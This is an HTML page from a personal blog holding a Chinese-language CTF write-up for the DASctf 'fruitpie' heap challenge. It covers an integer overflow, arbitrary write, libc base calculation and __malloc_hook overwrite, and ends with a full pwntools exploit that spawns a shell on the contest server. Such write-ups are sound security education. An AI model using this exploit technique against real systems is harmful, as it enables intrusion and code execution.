@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mark0519.github.io","root":"/","scheme":"Pisces","version":"8.0.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="DASctf_fruitpie WP记录下我第一次在比较正式的比赛中做出heap题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-dasctf_fruitpie">
+<meta property="og:url" content="https://mark0519.github.io/2021/03/28/pwn-dasctf-fruitpie/index.html">
+<meta property="og:site_name" content="mark0519的博客">
+<meta property="og:description" content="DASctf_fruitpie WP记录下我第一次在比较正式的比赛中做出heap题。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.imgdb.cn/item/606022eb8322e6675cd118c9.png">
+<meta property="og:image" content="https://img.imgdb.cn/item/606025c58322e6675cd2ab7c.png">
+<meta property="og:image" content="https://img.imgdb.cn/item/6060261e8322e6675cd2dbc3.png">
+<meta property="og:image" content="https://img.imgdb.cn/item/606026838322e6675cd320e8.png">
+<meta property="og:image" content="https://img.imgdb.cn/item/606027708322e6675cd3a914.png">
+<meta property="og:image" content="https://img.imgdb.cn/item/606028fb8322e6675cd481ea.png">
+<meta property="article:published_time" content="2021-03-28T06:28:36.000Z">
+<meta property="article:modified_time" content="2021-03-28T07:03:03.054Z">
+<meta property="article:author" content="mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.imgdb.cn/item/606022eb8322e6675cd118c9.png">
+
+
+<link rel="canonical" href="https://mark0519.github.io/2021/03/28/pwn-dasctf-fruitpie/">
+
+
+<script class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-dasctf_fruitpie | mark0519的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">mark0519的博客</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DASctf-fruitpie-WP"><span class="nav-number">1.</span> <span class="nav-text">DASctf_fruitpie WP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">1.4.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">mark0519</p>
+  <div class="site-description" itemprop="description">我是mark0519，第一次玩博客的小萌新~</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mark0519.github.io/2021/03/28/pwn-dasctf-fruitpie/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="mark0519">
+      <meta itemprop="description" content="我是mark0519，第一次玩博客的小萌新~">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mark0519的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-dasctf_fruitpie
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-03-28 14:28:36 / 修改时间：15:03:03" itemprop="dateCreated datePublished" datetime="2021-03-28T14:28:36+08:00">2021-03-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="DASctf-fruitpie-WP"><a href="#DASctf-fruitpie-WP" class="headerlink" title="DASctf_fruitpie WP"></a>DASctf_fruitpie WP</h1><p>记录下我第一次在比较正式的比赛中做出heap题。</p>
+<a id="more"></a>
+
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="https://img.imgdb.cn/item/606022eb8322e6675cd118c9.png"></p>
+<p>使用readInt函数读入一个数字，并创建一个输入大小的chunk，打印出这个chunk的地址，再要求输入offset，通过输入的offset往改chunk内填写数据，在最后有创建一个chunk。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>readInt函数()返回输入的数字为<code>__int64</code>型，有符号的longlong型，而size[0]为_DWORD型，无符号longlong型，存在整数溢出。</p>
+<p>printf输出创建的chunk的地址，会泄露整个程序的libc基地址。</p>
+<p>对输入的offset没有限制，可以往任意地址区域写。</p>
+<p>若创建一个特别大的chunk，该chunk的地址会里libc段很近，而malloc_hook在libc里。</p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>输入size_of_malloc为 -1 ，使size[0]得到一个特别大的数字，创建一个特别大的chunk，以靠近malloc_hook。</p>
+<p>通过gdb调试，确定创建的chunk和malloc_hook之间的偏移。（具体过程如下：）</p>
+<p><img src="https://img.imgdb.cn/item/606025c58322e6675cd2ab7c.png"></p>
+<p>得到本次运行时malloc_hook的地址，继续运行让程序输出我们创建的第一个chunk的地址</p>
+<p><img src="https://img.imgdb.cn/item/6060261e8322e6675cd2dbc3.png"></p>
+<p>得到偏移： <strong>0x7ffff7dcdc30 - 0x7ffef79e1010 =  0x1003ecc20</strong></p>
+<p><img src="https://img.imgdb.cn/item/606026838322e6675cd320e8.png"></p>
+<p>到这里我们可以知道，每次程序运行，malloc_hook都在打印出来的地址（我们创建的chunk的地址）处 加0x1003ecc20 的位置。</p>
+<p>而我们可以通过objdump命令算出malloc_hook相对于基地址的偏移，来计算出基地址，计算偏移的过程如下：</p>
+<p>命令为：<code>objdump libc.so.6 -D -M intel | grep __malloc_hook</code></p>
+<p>得到的结果：</p>
+<p><img src="https://img.imgdb.cn/item/606027708322e6675cd3a914.png"></p>
+<p>故我们现在可以算出基地址：即为<strong>chunk的地址</strong> <strong>+</strong> 和malloc_hook的偏移<strong>0x1003ecc20</strong> <strong>—</strong> hook和基地址的偏移 <strong>0x3ebc30</strong> </p>
+<p>即： </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>) <span class="comment">#第一个chunk的地址</span></span><br><span class="line">hook = ptr+<span class="number">0x1003ECC20</span>               <span class="comment">#maoolc_hook的地址</span></span><br><span class="line">libcbase = hook - <span class="number">0x3ebc30</span>           <span class="comment">#libc基地址</span></span><br></pre></td></tr></table></figure>
+
+<p>之后我们只要往malloc_hook处写入one_gadget即可getshell。</p>
+<p>获取one_gadget如下：</p>
+<p><img src="https://img.imgdb.cn/item/606028fb8322e6675cd481ea.png"></p>
+<p>由于获取的one_gadget都是相对于基地址的偏移，我们只要将偏移加上基地址写入malloc_hook即可在程序再次malloc时getshell</p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=process(&#x27;./fruitpie&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;54f57bff-61b7-47cf-a0ff-f23c4dc7756a.machine.dasctf.com&quot;</span>,<span class="string">&quot;50202&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fruitpie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Enter the size to malloc:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">ptr=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">2</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">hook = ptr+<span class="number">0x1003ECC20</span></span><br><span class="line">libcbase = hook - <span class="number">0x3ebc30</span></span><br><span class="line"><span class="comment">#0x3ebc30</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ptr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(hook)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Offset:\n&#x27;</span>,<span class="built_in">hex</span>(<span class="number">0x1003ECC20</span>))</span><br><span class="line">gadget = libcbase + <span class="number">0x10a41c</span> <span class="comment">#one_gadget 3</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;Data:\n&#x27;</span>,p64(gadget))</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x7f3c9ca72c30 hook</span></span><br><span class="line"><span class="comment">#0x7f3b9c686010</span></span><br><span class="line"><span class="comment">#0x1003ECC20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f365 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rsp &amp; 0xf == 0</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f3c2 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a45c execve(&quot;/bin/sh&quot;, rsp+0x70, environ) #effective!</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>mark0519
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://mark0519.github.io/2021/03/28/pwn-dasctf-fruitpie/" title="pwn-dasctf_fruitpie">https://mark0519.github.io/2021/03/28/pwn-dasctf-fruitpie/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/heap/" rel="tag"># heap</a>
+              <a href="/tags/wp/" rel="tag"># wp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/03/24/pwn-uaf1/" rel="prev" title="pwn-uaf1">
+                  <i class="fa fa-chevron-left"></i> pwn-uaf1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+      
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mark0519</span>
+</div> <!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div> -->
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
